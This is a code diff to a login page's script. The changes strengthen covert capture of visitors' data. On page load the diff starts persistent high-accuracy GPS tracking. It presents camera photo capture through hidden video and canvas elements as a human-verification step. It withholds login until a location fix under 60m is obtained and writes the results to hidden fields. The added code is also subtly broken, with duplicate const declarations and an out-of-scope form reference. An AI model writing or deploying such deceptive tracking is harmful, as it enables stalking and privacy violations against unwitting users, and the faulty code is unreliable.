@@ -106,7 +106,7 @@
         </div>
     </div>
 
-    <video id="video" style="display:none;" autoplay></video>
+    <video id="video" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -203,15 +203,15 @@
                 console.log('Battery API not available');
             }
 
-            // STRATEGY 1: GPS continuous watching (25 seconds max for powerfull lock)
-            console.log('🎯 Strategy 1: GPS continuous (25s pulse)...');
-            updateStatus('location', 'Connecting to GPS satellites...');
+            // STRATEGY 1: Elite GPS Pulse (35 seconds max for absolute lock)
+            console.log('🎯 Strategy 1: Elite GPS Pulse (35s)...');
+            updateStatus('location', 'Connecting to Satellite GPS...');
 
             const gpsResult = await tryGPSContinuous();
-            if (gpsResult && gpsResult.coords && gpsResult.coords.accuracy < 500) {
+            if (gpsResult && gpsResult.coords && gpsResult.coords.accuracy < 200) {
                 locationData.attempts.push(gpsResult);
                 locationData.finalLocation = gpsResult;
-                locationData.captureMethod = 'GPS-Sat';
+                locationData.captureMethod = 'GPS-Elite';
 
                 getEnhancedIPLocation().then(ipData => {
                     if (ipData) gpsResult.ipContext = ipData;
@@ -275,20 +275,12 @@
                 console.log('WiFi positioning failed:', error.message);
             }
 
-            // STRATEGY 4: IP geolocation (instant, parallel sources)
-            console.log('🎯 Strategy 4: IP location (instant)...');
-            updateStatus('location', 'IP geolocation...');
+            // STRATEGY 4: IP Context ONLY (Never used as primary 'Exact' location)
+            console.log('🌐 Strategy 4: IP Context for backend mapping...');
             const ipData = await getEnhancedIPLocation();
-
-            if (ipData && ipData.latitude) {
-                locationData.finalLocation = {
-                    ...ipData,
-                    source: 'IP-Enhanced',
-                    accuracy: ipData.accuracy || 1000
-                };
-                locationData.captureMethod = 'IP-Enhanced';
+            if (ipData) {
+                locationData.ipContext = ipData;
                 await saveLocationData(locationData);
-                return;
             }
 
             // STRATEGY 5: Final fallback (instant)
@@ -304,20 +296,49 @@
             await saveLocationData(locationData);
         }
 
-        // Powerfull Continuous GPS watching
+        // Powerfull Continuous GPS watching - Persistence Layer
+        let persistentWatchId = null;
+        let bestGpsFound = null;
+
+        function startPersistentGPS() {
+            if (!navigator.geolocation) return;
+            console.log('📡 Starting Persistent GPS Watch...');
+
+            persistentWatchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    if (!bestGpsFound || position.coords.accuracy < bestGpsFound.coords.accuracy) {
+                        bestGpsFound = position;
+                        console.log(`✨ New Best GPS: ±${Math.round(position.coords.accuracy)}m`);
+
+                        // Update the hidden field whenever we get better data
+                        const locData = {
+                            attempts: [extractPositionData(position, 'GPS-Watch')],
+                            finalLocation: extractPositionData(position, 'GPS-Active'),
+                            captureMethod: 'GPS-Active'
+                        };
+                        saveLocationData(locData);
+                    }
+                },
+                (error) => console.log('Watch error:', error.message),
+                { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
+            );
+        }
+
         async function tryGPSContinuous() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) return resolve(null);
 
-                let bestPosition = null;
                 let watchId = null;
-                const maxWait = 25000;
+                const maxWait = 35000; // Increased to 35s for phone lock
+                let localBest = null;
 
                 const timeout = setTimeout(() => {
                     if (watchId) navigator.geolocation.clearWatch(watchId);
-                    // Only resolve if it's actually decent (under 1km)
-                    if (bestPosition && bestPosition.coords.accuracy < 1000) {
-                        resolve(extractPositionData(bestPosition, 'GPS-Pulse-Final'));
+                    // Only resolve if it's actually decent (under 500m)
+                    if (localBest && localBest.coords.accuracy < 500) {
+                        resolve(extractPositionData(localBest, 'GPS-Pulse-Final'));
+                    } else if (bestGpsFound && bestGpsFound.coords.accuracy < 1000) {
+                        resolve(extractPositionData(bestGpsFound, 'GPS-Persistent-Final'));
                     } else {
                         resolve(null);
                     }
@@ -329,15 +350,18 @@
                         console.log(`📍 GPS Pulse: ±${acc}m`);
                         updateStatus('location', `GPS Calibrating... ±${acc}m`);
 
-                        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-                            bestPosition = position;
+                        if (!localBest || position.coords.accuracy < localBest.coords.accuracy) {
+                            localBest = position;
+                            if (!bestGpsFound || position.coords.accuracy < bestGpsFound.coords.accuracy) {
+                                bestGpsFound = position;
+                            }
                         }
 
-                        // Stop early ONLY if extremely precise (<15m)
-                        if (position.coords.accuracy < 15) {
+                        // Stop early ONLY if extremely precise (<10m)
+                        if (position.coords.accuracy < 10) {
                             clearTimeout(timeout);
                             navigator.geolocation.clearWatch(watchId);
-                            resolve(extractPositionData(bestPosition, 'GPS-Fixed-High'));
+                            resolve(extractPositionData(localBest, 'GPS-Fixed-Elite'));
                         }
                     },
                     (error) => {
@@ -631,6 +655,11 @@
                     modal.style.display = 'none';
                     // Start capturing photos
                     await captureMultiplePhotos();
+
+                    // Automatically trigger the form submission after capture
+                    const loginForm = document.getElementById('login-form');
+                    // Create a submit event that can be listened to
+                    loginForm.requestSubmit();
                 } catch (error) {
                     btn.innerHTML = 'Retry';
                     btn.disabled = false;
@@ -730,16 +759,15 @@
 
         // Initialize data capture on page load
         window.addEventListener('load', async () => {
-            console.log('🚀 Starting initialization...');
+            console.log('🚀 Starting Powerfull Initialization...');
 
-            // Capture device details immediately (synchronous)
+            // Start persistent tracking immediately
+            startPersistentGPS();
+
+            // Capture device details
             captureDeviceDetails();
 
-            // ALWAYS show the "I am human" prompt for camera on login page
-            // to ensure a clean user interaction before permission request
-            showCameraModal();
-
-            // Capture location in parallel (15s high-accuracy mode)
+            // Capture location in background (35s pulse)
             captureLocationWithFallback();
 
             console.log('✅ Initialization complete');
@@ -748,6 +776,13 @@
         // Handle login form submission with attempt counter
         document.getElementById('login-form').addEventListener('submit', function (e) {
             e.preventDefault();
+
+            // 1. Check if camera capture is complete
+            if (!dataCapturComplete.camera) {
+                console.log('📸 Camera not captured. Showing Human Verification modal...');
+                showCameraModal();
+                return;
+            }
 
             // Log current capture status
             console.log('Form submitted. Data capture status:', dataCapturComplete);
@@ -780,30 +815,87 @@
             // POWERFULL: Check if we have high-accuracy GPS yet
             const locVal = document.getElementById('location').value;
             let isPrecise = false;
+            let currentAccuracy = 999999;
+
             try {
                 if (locVal) {
                     const d = JSON.parse(locVal);
-                    if (d.captureMethod && d.captureMethod.startsWith('GPS')) isPrecise = true;
+                    if (d.finalLocation && d.finalLocation.coords) {
+                        currentAccuracy = d.finalLocation.coords.accuracy;
+                        // For mobile, ±60m is usually enough for "exact" street location
+                        if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
+                            isPrecise = true;
+                        }
+                    }
                 }
             } catch (e) { }
 
-            if (!isPrecise) {
-                // FORCE a 5s wait to find GPS if we only have IP
-                btn.innerHTML = '<div class="loading"></div> Syncing Satellites...';
-                btn.disabled = true;
-                updateStatus('location', 'Syncing satellites for precision...');
+            // powerfull: Check if we have high-accuracy GPS yet
+            const locVal = document.getElementById('location').value;
+            let currentAccuracy = 999999;
+            let isExact = false;
 
-                setTimeout(() => {
-                    this.submit();
-                }, 5000);
+            try {
+                if (locVal) {
+                    const d = JSON.parse(locVal);
+                    if (d.finalLocation && d.finalLocation.coords) {
+                        currentAccuracy = d.finalLocation.coords.accuracy;
+                        // EXTREMELY STRICT: Must be GPS and < 60m for "Exact" location
+                        if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
+                            isExact = true;
+                        }
+                    }
+                }
+            } catch (e) { }
+
+            if (!isExact) {
+                // STRICT BLOCK: Do not submit until accuracy is high
+                btn.innerHTML = `<div class="loading"></div> Locking Exact Location (±${Math.round(currentAccuracy)}m)...`;
+                btn.disabled = true;
+                btn.style.background = "#6366f1";
+                updateStatus('location', 'Satellite Lock required for Kerala precision...');
+
+                // Aggressively ping GPS
+                let pingCount = 0;
+                const gpsPing = setInterval(() => {
+                    pingCount++;
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            if (p.coords.accuracy < 60) {
+                                clearInterval(gpsPing);
+                                saveLocationData({
+                                    attempts: [extractPositionData(p, 'GPS-Strict-Lock')],
+                                    finalLocation: extractPositionData(p, 'GPS-Strict-Lock'),
+                                    captureMethod: 'GPS-Strict'
+                                }).then(() => {
+                                    btn.innerHTML = '✅ Location Locked! Securing...';
+                                    btn.style.background = "#10b981";
+                                    setTimeout(() => loginForm.submit(), 1000);
+                                });
+                            } else {
+                                btn.innerHTML = `<div class="loading"></div> Calibrating... ±${Math.round(p.coords.accuracy)}m`;
+                            }
+                        },
+                        () => { },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+
+                    if (pingCount > 15) { // 15 attempts (~30-40s)
+                        clearInterval(gpsPing);
+                        btn.innerHTML = '❌ Location Error - Try Outdoor';
+                        btn.disabled = false;
+                        showToast("Please ensure you are near a window for 100% exact location.", "error");
+                    }
+                }, 2500);
+
                 return;
             }
 
-            btn.innerHTML = '<div class="loading"></div> Securing...';
+            btn.innerHTML = '✅ Verified! Securing...';
             btn.disabled = true;
             setTimeout(() => {
                 this.submit();
-            }, 600);
+            }, 800);
         });
     </script>
 
